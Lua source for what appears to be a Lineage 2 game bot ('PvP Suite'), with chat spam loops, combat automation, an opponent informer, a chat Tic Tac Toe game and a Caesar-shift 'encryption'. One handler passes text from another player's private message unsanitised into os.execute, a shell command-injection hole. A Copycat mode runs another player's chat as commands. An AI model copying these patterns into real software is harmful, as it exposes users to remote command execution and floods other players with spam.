		elseif (vCommandParam:GetParam(0):GetStr(true) == "Spacebar") then
				YTQuery = YTQuery.." ";
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Caps Lock") then
				if (caps) then
					caps = false;
				else
					caps = true;
				end;
		else
			YTQuery = YTQuery..vCommandParam:GetParam(0):GetStr(true);
		end;
	end;
	DoDialog("YouTube");
end;
function OnCommand_em(vCommandChatType, vNick, vCommandParam)
	if (vCommandParam:GetCount() == 1) then
		if (vCommandParam:GetParam(0):GetStr(true) == "Backspace") then
			EMQuery = string.sub(EMQuery, 1, string.len(EMQuery)-1);
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Clear") then
				EMQuery = "";
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Spacebar") then
				EMQuery = EMQuery.." ";
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Caps Lock") then
				if (caps4) then
					caps4 = false;
				else
					caps4 = true;
				end;
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Send") then
				if (EMQuery ~= "") then
					if (GetTarget() ~= nil) then
						if (GetTarget():IsPlayer()) then
							SendPM(GetTarget():GetName(),"[E~]"..EncryptMessage(EMQuery))
						else
							ShowToClient("Other","Your target is not a player!");
						end;
					else
						ShowToClient("Other","Please target someone first!");
					end;
				else
					ShowToClient("Other","Please type something first!");
				end;
		else
			EMQuery = EMQuery..vCommandParam:GetParam(0):GetStr(true);
		end;
	end;
	DoDialog("Send Encrypted Message");
end;
function OnCommand_admsgq(vCommandChatType, vNick, vCommandParam)
	if (vCommandParam:GetCount() == 1) then
		if (vCommandParam:GetParam(0):GetStr(true) == "Backspace") then
			PvPSuite[42] = string.sub(PvPSuite[42], 1, string.len(PvPSuite[42])-1);
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Clear") then
				PvPSuite[42] = "";
				PvPSuite[41] = "0";
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Spacebar") then
				PvPSuite[42] = PvPSuite[42].." ";
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Caps Lock") then
				if (caps3) then
					caps3 = false;
				else
					caps3 = true;
				end;
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Shout Chat") then
				if (PvPSuite[42] ~= "") then
					if (PvPSuite[41] == "1") then
						PvPSuite[41] = "0";
						ShowToClient("Enhances","Auto Message On Kill disabled!");
					else
						PvPSuite[41] = "1";
						ShowToClient("Enhances","Auto Message On Kill enabled at Shout C.!");
						ShowToClient("Message",tostring(PvPSuite[42]).." name-here");
					end;
				else
					ShowToClient("Enhances","Please type a message first!");
				end;
		elseif (vCommandParam:GetParam(0):GetStr(true) == "General Chat") then
				if (PvPSuite[42] ~= "") then
					if (PvPSuite[41] == "2") then
						PvPSuite[41] = "0";
						ShowToClient("Enhances","Auto Message On Kill disabled!");
					else
						PvPSuite[41] = "2";
						ShowToClient("Enhances","Auto Message On Kill enabled at General C.!");
						ShowToClient("Message",tostring(PvPSuite[42]).." name-here");
					end;
				else
					ShowToClient("Enhances","Please type a message first!");
				end;
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Party Chat") then
				if (PvPSuite[42] ~= "") then
					if (PvPSuite[41] == "3") then
						PvPSuite[41] = "0";
						ShowToClient("Enhances","Auto Message On Kill disabled!");
					else
						PvPSuite[41] = "3";
						ShowToClient("Enhances","Auto Message On Kill enabled at Party C.!");
						ShowToClient("Message",tostring(PvPSuite[42]).." name-here");
					end;
				else
					ShowToClient("Enhances","Please type a message first!");
				end;
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Test Message") then
				ShowToClient("Enhances",tostring(PvPSuite[42]).." name-here");
		else
			PvPSuite[42] = PvPSuite[42]..vCommandParam:GetParam(0):GetStr(true);
		end;
	end;
	DoDialog("Auto Message On Kill");
end;
function OnCommand_spamq(vCommandChatType, vNick, vCommandParam)
	if (IsPremium()) then
		if (vCommandParam:GetCount() == 1) then
			if (vCommandParam:GetParam(0):GetStr(true) == "Backspace") then
				SpamQuery = string.sub(SpamQuery, 1, string.len(SpamQuery)-1);
			elseif (vCommandParam:GetParam(0):GetStr(true) == "Clear") then
					SpamQuery = "";
			elseif (vCommandParam:GetParam(0):GetStr(true) == "Spacebar") then
					SpamQuery = SpamQuery.." ";
			elseif (vCommandParam:GetParam(0):GetStr(true) == "Caps Lock") then
					if (caps2) then
						caps2 = false;
					else
						caps2 = true;
					end;
			elseif (vCommandParam:GetParam(0):GetStr(true) == "General") then
					if (SpamQuery ~= "") then
						for I=1,5 do
							Say2(L2ChatType.CHAT_NORMAL,SpamQuery,"");
						end;
					else
						ShowToClient("Premium","Type something first!");
					end;
			elseif (vCommandParam:GetParam(0):GetStr(true) == "Shout") then
					if (SpamQuery ~= "") then
						for I=1,5 do
							Say2(L2ChatType.CHAT_SHOUT,SpamQuery,"");
						end;
					else
						ShowToClient("Premium","Type something first!");
					end;
			elseif (vCommandParam:GetParam(0):GetStr(true) == "Trade") then
					if (SpamQuery ~= "") then
						for I=1,5 do
							Say2(L2ChatType.CHAT_MARKET,SpamQuery,"");
						end;
					else
						ShowToClient("Premium","Type something first!");
					end;
			else
				SpamQuery = SpamQuery..vCommandParam:GetParam(0):GetStr(true);
			end;
		elseif (vCommandParam:GetCount() == 2) then
				if (vCommandParam:GetParam(0):GetStr(true) == "General") then
					if (SpamQuery ~= "") then
						for I=1,tonumber(vCommandParam:GetParam(1):GetStr(true)) do
							Say2(L2ChatType.CHAT_NORMAL,SpamQuery,"");
						end;
					else
						ShowToClient("Premium","Type something first!");
					end;
				elseif (vCommandParam:GetParam(0):GetStr(true) == "Shout") then
						if (SpamQuery ~= "") then
							for I=1,tonumber(vCommandParam:GetParam(1):GetStr(true)) do
								Say2(L2ChatType.CHAT_SHOUT,SpamQuery,"");
							end;
						else
							ShowToClient("Premium","Type something first!");
						end;
				elseif (vCommandParam:GetParam(0):GetStr(true) == "Trade") then
						if (SpamQuery ~= "") then
							for I=1,tonumber(vCommandParam:GetParam(1):GetStr(true)) do
								Say2(L2ChatType.CHAT_MARKET,SpamQuery,"");
							end;
						else
							ShowToClient("Premium","Type something first!");
						end;
				end;
		end;
	else
		ShowToClient("Premium","You must have L2T premium license to use this feature!");
	end;
	DoDialog("Spam Chat(No CB)");
end;
function OnCommand_spam(vCommandChatType, vNick, vCommandParam)
	DoDialog("Spam Chat(No CB)");
end;
function OnTeleportToLocation(user, oldLocation, newLocation)
	if (PvPSuite[19]) then
		if (GetTarget() ~= nil) then
			if (user:GetName() == GetTarget():GetName()) then	
				ShowToClient("Spy",user:GetName().." teleported to "..GetZoneName(newLocation));
			end;
		end;
	end;
end;
function OnChatSystemMessage(id, msg)
	if (id == 2261) then
		local dmsg = msg;
		dmsg = dmsg:match(" %d+ ");
		if (dmsg ~= nil) then
			dmsg = dmsg:gsub(" ","");
		end;
		if (tonumber(dmsg) ~= nil) then
			damageDone = damageDone + dmsg;
			if (ShowOnEachDoneHit) then
				DoDialog("Damage Counter");
			end;
		end;
	elseif (id == 2262) then
			local dmsg = msg;
			dmsg = dmsg:match(" %d+ ");
			if (dmsg ~= nil) then
				dmsg = dmsg:gsub(" ","");
			end;
			if (tonumber(dmsg) ~= nil) then
				damageReceived = damageReceived + dmsg;
				if (ShowOnEachReceivedHit) then
					DoDialog("Damage Counter");
				end;
			end;
	elseif (id == 1269) then
			if (PvPSuite[61]) then
				ActivateSoulShot(1467,true);
				ActivateSoulShot(2514,true);
				ActivateSoulShot(3952,true);
				ActivateSoulShot(6646,true);
				ActivateSoulShot(6647,true);
				ActivateSoulShot(20333,true);
				ActivateSoulShot(20334,true);
				ActivateSoulShot(22076,true);
				ActivateSoulShot(22081,true);
				ActivateSoulShot(22086,true);
			end;
	elseif (id == 1270) then
			if (PvPSuite[61]) then				
				ActivateSoulShot(1467,true);
				ActivateSoulShot(2514,true);
				ActivateSoulShot(3952,true);
				ActivateSoulShot(6646,true);
				ActivateSoulShot(6647,true);
				ActivateSoulShot(20333,true);
				ActivateSoulShot(20334,true);
				ActivateSoulShot(22076,true);
				ActivateSoulShot(22081,true);
				ActivateSoulShot(22086,true);
			end;
	end;
	if (PvPSuite[61]) then
		if ((id == 1495) and (string.find(msg,"60") ~= nil)) then
			ActivateSoulShot(1467,true);
			ActivateSoulShot(2514,true);
			ActivateSoulShot(3952,true);
			ActivateSoulShot(6646,true);
			ActivateSoulShot(6647,true);
			ActivateSoulShot(20333,true);
			ActivateSoulShot(20334,true);
			ActivateSoulShot(22076,true);
			ActivateSoulShot(22081,true);
			ActivateSoulShot(22086,true);
		end;
	end;
	if (PvPSuite[44]) then
		if (id == 1495) then
			if (alreadySaidOly == false) then
				local players = GetPlayerList();
				for user in players.list do
					if (IsInMyArena(user)) then
						local Name = user:GetName();
						local Clan = user:GetClanName();
						local Class = L2Class2String(user:GetClass());
						ShowToClient("Opponent's Name",Name);
						if (user:GetClanName() ~= "") then
							ShowToClient("Opponent's Clan",Clan);
						end;
						ShowToClient("Opponent's Class",Class);
						alreadySaidOly = true;
						break;
					end;
				end;
			end;
		end;
		if (id == 1496) then
			alreadySaidOly = false;
		end;
	end;
end;
function EncryptMessage(m)
	local x, encrypted;
	encrypted = "";
	for x = 1, #m do
		encrypted = encrypted .. string.char(m:byte(x) + 3);
	end;
	return encrypted;
end;
function DecryptMessage(m)
	local x, decrypted;
	decrypted = "";
	for x = 1, #m do
		decrypted = decrypted .. string.char(m:byte(x) - 3);
	end;
	return decrypted;
end;
function OnChatUserMessage(chatType, nick, msg)
	if (chatType == 2) then
		if (string.find(msg,"[[]E~[]]") ~= nil) then
			whoSaidEnc = nick;
			encMsg = string.gsub(msg,"[[]E~[]]","");
			showDecryptedMsg = true;
			Timer[19] = 0;
		end;
		if (nick == MyName) then
			if ((msg == randomGeneratedCommand) or (msg == "p") or (msg == "pvpsuite")) then
				MainMenu();
			end;
		end;
	end;
	if (Copycat) then
		if ((chatType == 0) and (nick == CopycatName)) then
			Command(msg);
		end;
	end;
	if (nick == TTT[3]) then
		if ((chatType == 2) and (TTT[4])) then	 
			if (msg == "~_ B1") then
				B[1] = TTT[8];
				TTT[6] = true;
				DoGame("TicTacToeContinue");
			elseif (msg == "~_ B2") then
					B[2] = TTT[8];
					TTT[6] = true;
					DoGame("TicTacToeContinue");
			elseif (msg == "~_ B3") then
					B[3] = TTT[8];
					TTT[6] = true;
					DoGame("TicTacToeContinue");
			elseif (msg == "~_ B4") then
					B[4] = TTT[8];
					TTT[6] = true;
					DoGame("TicTacToeContinue");
			elseif (msg == "~_ B5") then
					B[5] = TTT[8];
					TTT[6] = true;
					DoGame("TicTacToeContinue");
			elseif (msg == "~_ B6") then
					B[6] = TTT[8];
					TTT[6] = true;
					DoGame("TicTacToeContinue");
			elseif (msg == "~_ B7") then
					B[7] = TTT[8];
					TTT[6] = true;
					DoGame("TicTacToeContinue");
			elseif (msg == "~_ B8") then
					B[8] = TTT[8];
					TTT[6] = true;
					DoGame("TicTacToeContinue");
			elseif (msg == "~_ B9") then
					B[9] = TTT[8];
					TTT[6] = true;
					DoGame("TicTacToeContinue");
			elseif (msg == "[~_ E]") then
					if ((TTT[1]) and (TTT[4])) then
						ShowToClient("Tic Tac Toe","Your opponent ended the game!");			
						B = {"B1","B2","B3","B4","B5","B6","B7","B8","B9"};
						TTT[1] = false;
						TTT[3] = "";
						TTT[4] = false;
						TTT[6] = false;
						TTT[9] = false;
						TTT[10] = true;
						TTT[12] = false;
						awaitingResponse = false;
						confirmedResponse = false;
						DoGameDialog("Tic Tac Toe");
					end;
			elseif (msg == "[~_ T~_ T]X") then
					if (TTT[7] == "X") then
						TTT[11] = true;
					else
						TTT[11] = false;
					end;
						TTT[9] = true;
						DoGame("TicTacToeContinue");
			elseif (msg == "[~_ T~_ T]O") then	
					if (TTT[7] == "O") then
						TTT[11] = true;
					else
						TTT[11] = false;
					end;	
						TTT[9] = true;
						DoGame("TicTacToeContinue");
			elseif (msg == "[~_ T~_ T]D") then	
					TTT[9] = true;
					TTT[12] = true;
					DoGame("TicTacToeContinue");
			end;
		elseif ((chatType == 3)) then
				if (msg:lower() == "b1") then
					if (TTT[6]) then
						PTMsg(TTT[3]..", its not your turn to play!");
					else
						if (B[1] == "B1") then
							B[1] = TTT[8];
							TTT[6] = true;
							PTMsg("~~Tic Tac Toe~~");
							miniFreeze();
							PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
							miniFreeze();
							PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
							miniFreeze();
							PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
							miniFreeze();
							PTMsg("~~~~~~~~~~~");
							DoGame("TicTacToeContinue");
						else
							PTMsg(TTT[3]..", this box is already marked!");
						end;
					end;
				elseif (msg:lower() == "b2") then
						if (TTT[6]) then
							PTMsg(TTT[3]..", its not your turn to play!");
						else
							if (B[2] == "B2") then
								B[2] = TTT[8];
								TTT[6] = true;
								PTMsg("~~Tic Tac Toe~~");
								miniFreeze();
								PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
								miniFreeze();
								PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
								miniFreeze();
								PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
								miniFreeze();
								PTMsg("~~~~~~~~~~~");
								DoGame("TicTacToeContinue");
							else
								PTMsg(TTT[3]..", this box is already marked!");
							end;
						end;
				elseif (msg:lower() == "b3") then
						if (TTT[6]) then
							PTMsg(TTT[3]..", its not your turn to play!");
						else
							if (B[3] == "B3") then
								B[3] = TTT[8];
								TTT[6] = true;
								PTMsg("~~Tic Tac Toe~~");
								miniFreeze();
								PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
								miniFreeze();
								PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
								miniFreeze();
								PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
								miniFreeze();
								PTMsg("~~~~~~~~~~~");
								DoGame("TicTacToeContinue");
							else
								PTMsg(TTT[3]..", this box is already marked!");
							end;
						end;
				elseif (msg:lower() == "b4") then
						if (TTT[6]) then
							PTMsg(TTT[3]..", its not your turn to play!");
						else
							if (B[4] == "B4") then
								B[4] = TTT[8];
								TTT[6] = true;
								PTMsg("~~Tic Tac Toe~~");
								miniFreeze();
								PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
								miniFreeze();
								PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
								miniFreeze();
								PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
								miniFreeze();
								PTMsg("~~~~~~~~~~~");
								DoGame("TicTacToeContinue");
							else
								PTMsg(TTT[3]..", this box is already marked!");
							end;
						end;
				elseif (msg:lower() == "b5") then
						if (TTT[6]) then
							PTMsg(TTT[3]..", its not your turn to play!");
						else
							if (B[5] == "B5") then
								B[5] = TTT[8];
								TTT[6] = true;
								PTMsg("~~Tic Tac Toe~~");
								miniFreeze();
								PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
								miniFreeze();
								PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
								miniFreeze();
								PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
								miniFreeze();
								PTMsg("~~~~~~~~~~~");
								DoGame("TicTacToeContinue");
							else
								PTMsg(TTT[3]..", this box is already marked!");
							end;
						end;
				elseif (msg:lower() == "b6") then
						if (TTT[6]) then
							PTMsg(TTT[3]..", its not your turn to play!");
						else
							if (B[6] == "B6") then
								B[6] = TTT[8];
								TTT[6] = true;
								PTMsg("~~Tic Tac Toe~~");
								miniFreeze();
								PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
								miniFreeze();
								PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
								miniFreeze();
								PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
								miniFreeze();
								PTMsg("~~~~~~~~~~~");
								DoGame("TicTacToeContinue");
							else
								PTMsg(TTT[3]..", this box is already marked!");
							end;
						end;
				elseif (msg:lower() == "b7") then
						if (TTT[6]) then
							PTMsg(TTT[3]..", its not your turn to play!");
						else
							if (B[7] == "B7") then
								B[7] = TTT[8];
								TTT[6] = true;
								PTMsg("~~Tic Tac Toe~~");
								miniFreeze();
								PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
								miniFreeze();
								PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
								miniFreeze();
								PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
								miniFreeze();
								PTMsg("~~~~~~~~~~~");
								DoGame("TicTacToeContinue");
							else
								PTMsg(TTT[3]..", this box is already marked!");
							end;
						end;
				elseif (msg:lower() == "b8") then
						if (TTT[6]) then
							PTMsg(TTT[3]..", its not your turn to play!");
						else
							if (B[8] == "B8") then
								B[8] = TTT[8];
								TTT[6] = true;
								PTMsg("~~Tic Tac Toe~~");
								miniFreeze();
								PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
								miniFreeze();
								PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
								miniFreeze();
								PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
								miniFreeze();
								PTMsg("~~~~~~~~~~~");
								DoGame("TicTacToeContinue");
							else
								PTMsg(TTT[3]..", this box is already marked!");
							end;
						end;
				elseif (msg:lower() == "b9") then
						if (TTT[6]) then
							PTMsg(TTT[3]..", its not your turn to play!");
						else
							if (B[9] == "B9") then
								B[9] = TTT[8];
								TTT[6] = true;
								PTMsg("~~Tic Tac Toe~~");
								miniFreeze();
								PTMsg("  ["..B[1].."] ["..B[2].."] ["..B[3].."]");
								miniFreeze();
								PTMsg("  ["..B[4].."] ["..B[5].."] ["..B[6].."]");
								miniFreeze();
								PTMsg("  ["..B[7].."] ["..B[8].."] ["..B[9].."]");
								miniFreeze();
								PTMsg("~~~~~~~~~~~");
								DoGame("TicTacToeContinue");
							else
								PTMsg(TTT[3]..", this box is already marked!");
							end;
						end;
				end;
		end;
	end;
	if (((msg == "[~_ T]X") or (msg == "[~_ T]O")) and (chatType == 2)) then
		if (awaitingResponse) then
			confirmedResponse = true;
			awaitingResponse = false;
		else
			if ((TTT[2]) and (TTT[1] == false)) then
				SendPM(nick,msg);
				TTT[3] = nick;
				TTT[1] = true;
				TTT[4] = true;
				TTT[10] = false;
				if (msg == "[~_ T]X") then
					TTT[8] = "X";
					TTT[7] = "O";
				elseif (msg == "[~_ T]O") then
						TTT[8] = "O";
						TTT[7] = "X";
				end;
				TTTDelayedMsgs = true;
			end;
		end;
	end;
	if ((msg == "[~_ YT]R") and (chatType == 2)) then
		if (PvPSuite[40]) then
			SendPM(nick,"[~_ YT]C");
		end;
	elseif ((msg == "[~_ YT]C") and (chatType == 2)) then
			if (YTawaiting) then
				YTconfirmed = true;
				YTawaiting = false;
			end;
	elseif ((string.find(msg,"[[]~_ YT[]][[]P[]]") ~= nil) and (chatType == 2) and (PvPSuite[40])) then
			local vid = string.gsub(msg,"[[]~_ YT[]][[]P[]]","");
			if ((vid ~= "") and (vid ~= nil)) then
				YTMsg = (nick.." sent you a video!");
				YTDelayedMsgs = true;
				os.execute('start "" "http://www.google.com/search?q=youtube '..vid..'&btnI" /MIN /B');
			else
				YTMsg = ("Error playing received video!");
				YTDelayedMsgs = true;
			end;
			
	end;
end;
function MainMenu()
	local html = THtmlGenerator("PvP Suite");
	html:AddHtml('<center><table border=0 cellpadding=0 cellspacing=0 width=292 height=358 background="L2UI_CT1.SlideShow_DF_Credit_02"><tr><td valign="top" align="center"><table border=0 cellpadding=0 cellspacing=0><tr><td width=0 height=35 background="L2UI_CT1.SlideShow_DF_Credit_02"></td></tr></table>');
	html:AddHtml('<table width=270 border=0 bgcolor=282828><tr><td><center>');
	html:AddHtml(GetRandomGreeting()..' <font color="9933FF">'..MyName.."</font>!</ br></center>");
	html:AddHtml('</td></tr><tr><td>');
	html:AddHtml("<center>"..GetRandomQuote().."</center>");
	html:AddHtml('</td></tr></table></ br></ br>');
	local Condition = false;
	if ((PvPSuite[1]) or (PvPSuite[2]) or (PvPSuite[3]) or (PvPSuite[4]) or (PvPSuite[33]) or (PvPSuite[34])) then
		Condition = true;
	end;
	html:AddHtml('<table width=125 border=0 bgcolor=282828><tr><td>');
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("Protections"),THtmlButtonStyle.BUTTON_EXTRA, "Protections",Condition,"","",120,25);
	html:AddHtml('</td><td>');
	Condition = false;
	if ((PvPSuite[5]) or (PvPSuite[6]) or (PvPSuite[41] ~= "0") or ((PvPSuite[16]) and (iHaveAoE())) or ((PvPSuite[18]) and (iHaveIRh())) or ((PvPSuite[30]) and (iHaveSkill(340))) or ((PvPSuite[31]) and (iHaveCleanse())) or ((PvPSuite[32]) and (iHaveAggroSk())) or (((PvPSuite[64]) and ((iHaveSkill(1016)) and (iHaveSkill(1254)))))) then
		Condition = true;
	end;
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("Enhances"),THtmlButtonStyle.BUTTON_EXTRA, "Enhances",Condition,"","",120,25);
	html:AddHtml('</td></tr></table>');
	Condition = false;
	if ((PvPSuite[7]) or (PvPSuite[8]) or (PvPSuite[9]) or (PvPSuite[35]) or (PvPSuite[62]) or (PvPSuite[63])) then
		Condition = true;
	end;
	html:AddHtml('<table width=125 border=0 bgcolor=282828><tr><td>');
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("Informers"),THtmlButtonStyle.BUTTON_EXTRA, "Informers",Condition,"","",120,25);
	html:AddHtml('</td><td>');
	Condition = false;
	if ((PvPSuite[10]) or (PvPSuite[11]) or (PvPSuite[12]) or (PvPSuite[36])) then
		Condition = true;
	end;
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("Party Informers"),THtmlButtonStyle.BUTTON_EXTRA, "Party Informers",Condition,"","",120,25);
	html:AddHtml('</td></tr></table>');
	Condition = false;
	if (PvPSuite[13]) then
		Condition = true;
	end;
	html:AddHtml('<table width=125 border=0 bgcolor=282828><tr><td>');
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("A Better Assist"),THtmlButtonStyle.BUTTON_EXTRA, "A Better Assist",Condition,"","",120,25);
	html:AddHtml('</td><td>');
	Condition = false;
	if ((PvPSuite[14]) or (PvPSuite[15])) then
		Condition = true;
	end;
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("Main Assister"),THtmlButtonStyle.BUTTON_EXTRA, "Main Assister",Condition,"","",120,25);
	html:AddHtml('</td></tr></table>');
	Condition = false;
	if ((PvPSuite[38]) or (PvPSuite[39]) or (PvPSuite[44])) then
		Condition = true;
	end;
	html:AddHtml('<table width=125 border=0 bgcolor=282828><tr><td>');
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("Olympiad"),THtmlButtonStyle.BUTTON_EXTRA, "Olympiad",Condition,"","",120,25);
	html:AddHtml('</td><td>');
	Condition = false;
	if ((PvPSuite[19]) or (PvPSuite[43])) then
		Condition = true;
	end;
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("Spy"),THtmlButtonStyle.BUTTON_EXTRA, "Spy",Condition,"","",120,25);
	html:AddHtml('</td></tr></table>');
	html:AddHtml('<table width=125 border=0 bgcolor=282828><tr><td>');
	Condition = false;
	if ((Copycat) or (TTT[2]) or (PvPSuite[40])) then
		Condition = true;
	end;
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("Other"),THtmlButtonStyle.BUTTON_EXTRA, "Other",Condition,"","",120,25);
	html:AddHtml('</td><td>');
	Style = THtmlButtonStyle.BUTTON_NO_CLICK;
	if (IsPremium()) then
		Style = THtmlButtonStyle.BUTTON_EXTRA;
	end;
	Condition = false;
	if ((PvPSuite[20]) or (PvPSuite[21]) or (PvPSuite[22]) or (PvPSuite[23]) or (PvPSuite[37])) then
		Condition = true;
	end;
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("Premium"),Style, "Premium",Condition,"","",120,25);
	html:AddHtml('</td></tr></table>');
	html:AddHtml('</br ></br ><table width=125 border=0 bgcolor=282828><tr><td>');
	html:AddButton(THtmlAction("/pvpsuite"):AddParam("Help Center"),THtmlButtonStyle.BUTTON_ACTION, "Help Center",false,"","",130,25);
	html:AddHtml('</td></tr></table><font color="FF0000">');
	html:AddHtml('<br><table width=125 border=0 bgcolor=282828><tr><td>');
	html:AddButton(THtmlAction("/doaction"):AddParam("WebP"),THtmlButtonStyle.BUTTON_ON_OFF, "PvPSuite.com",true,"","",100,25);
	html:AddHtml('</td><td>');
	html:AddButton(THtmlAction("/doaction"):AddParam("WebV"),THtmlButtonStyle.BUTTON_ON_OFF, "vShuffle.net",true,"","",100,25);
	html:AddHtml('</td></tr></table>');
	html:AddHtml('</font></td></tr></table></center>');
	HtmlBuild = html:GetString();	
	ShowHtmlStatus = true;
end;
function OnDeleteUser(user)
	if (PvPSuite[34]) then
		if (user:GetName() == LastTargeted) then
			LastTargeted = "";
		end;
	end;
end;
function SubMenu(param)
	local html = THtmlGenerator("PvP Suite > "..param);
	html:AddHtml('<center><img src="L2UI_CH3.herotower_deco" width=256 height=32 align=left>');
	if (param == "Protections") then
		local Condition = false;
		if ((PvPSuite[33])) then
			Condition = true;
		end;
		html:AddHtml("</br ></br >");
		html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=221><tr><td align=left valign=top width=236>');
		html:AddButton(THtmlAction("/doaction"):AddParam("Anti Deadly"),THtmlButtonStyle.BUTTON_EXTRA, "Anti Deadly",Condition,"","",120,25);
		html:AddHtml('</td><td align=right valign=top width=236><img src="'..GetSkillIcon(263)..'" height=32 width=32></br ></td></tr></table>');
		if (PvPSuite[17]) then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
			html:AddHtml("Your character will turn its face on Deadly Blow.");
			html:AddHtml("</td></tr></table>");
		end;
		Condition = false;
		if ((PvPSuite[1])) then
			Condition = true;
		end;
		html:AddHtml("</br ></br >");
		html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=221><tr><td align=left valign=top width=236>');
		html:AddButton(THtmlAction("/doaction"):AddParam("Anti Backstab"),THtmlButtonStyle.BUTTON_EXTRA, "Anti Backstab",Condition,"","",120,25);
		html:AddHtml('</td><td align=right valign=top width=236><img src="'..GetSkillIcon(30)..'" height=32 width=32></br ></td></tr></table>');
		if (PvPSuite[17]) then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=245><tr><td align=left valign=top width=236>");
			html:AddHtml("Your character will turn its face on Backstab.");
			html:AddHtml("</td></tr></table>");
		end;
		Condition = false;
		if ((PvPSuite[2])) then
			Condition = true;
		end;
		html:AddHtml("</br ></br >");
		html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
		html:AddButton(THtmlAction("/doaction"):AddParam("Anti Lethal"),THtmlButtonStyle.BUTTON_EXTRA, "Anti Lethal",Condition,"","",120,25);
		html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(344)..'" height=32 width=32></br ></td></tr></table>');
		if (PvPSuite[17]) then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
			html:AddHtml("Your character will turn its face on Lethal Blow.");
			html:AddHtml("</td></tr></table>");
		end;
		Condition = false;
		if ((PvPSuite[3])) then
			Condition = true;
		end;
		html:AddHtml("</br ></br >");
		html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
		html:AddButton(THtmlAction("/doaction"):AddParam("Anti Dual Blow"),THtmlButtonStyle.BUTTON_EXTRA, "Anti Dual Blow",Condition,"","",120,25);
		html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(928)..'" height=32 width=32></br ></td></tr></table>');
		if (PvPSuite[17]) then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=245><tr><td align=left valign=top width=236>");
			html:AddHtml("Your character will turn its face on Dual Blow.");
			html:AddHtml("</td></tr></table>");
		end;
		Condition = false;
		if ((PvPSuite[4])) then
			Condition = true;
		end;
		html:AddHtml("</br ></br >");
		html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=236><tr><td align=left valign=top width=236>');
		html:AddButton(THtmlAction("/doaction"):AddParam("Anti Disarm"),THtmlButtonStyle.BUTTON_EXTRA, "Anti Disarm",Condition,"","",120,25);
		html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(485)..'" height=32 width=32></br ></td></tr></table>');
		if (PvPSuite[17]) then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=240><tr><td align=left valign=top width=236>");
			html:AddHtml("Your character will re-equip your latest weapon once the disarm goes off.");
			html:AddHtml("</td></tr></table>");
		end;
		Condition = false;
		if ((PvPSuite[34])) then
			Condition = true;
		end;
		html:AddHtml("</br ></br >");
		html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=221><tr><td align=left valign=top width=236>');
		html:AddButton(THtmlAction("/doaction"):AddParam("Anti Target Loss"),THtmlButtonStyle.BUTTON_EXTRA, "Anti Target Loss",Condition,"","",120,25);
		html:AddHtml('</td><td align=right valign=top width=236><img src="'..GetSkillIcon(11)..'" height=32 width=32></br ></td></tr></table>');
		if (PvPSuite[17]) then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=237><tr><td align=left valign=top width=236>");
			html:AddHtml("Your character will fast retarget after switch/mirage/trick etc.. Please be careful since its very fast it may bug! Enable it only while PvPing!");
			html:AddHtml("</td></tr></table>");
		end;
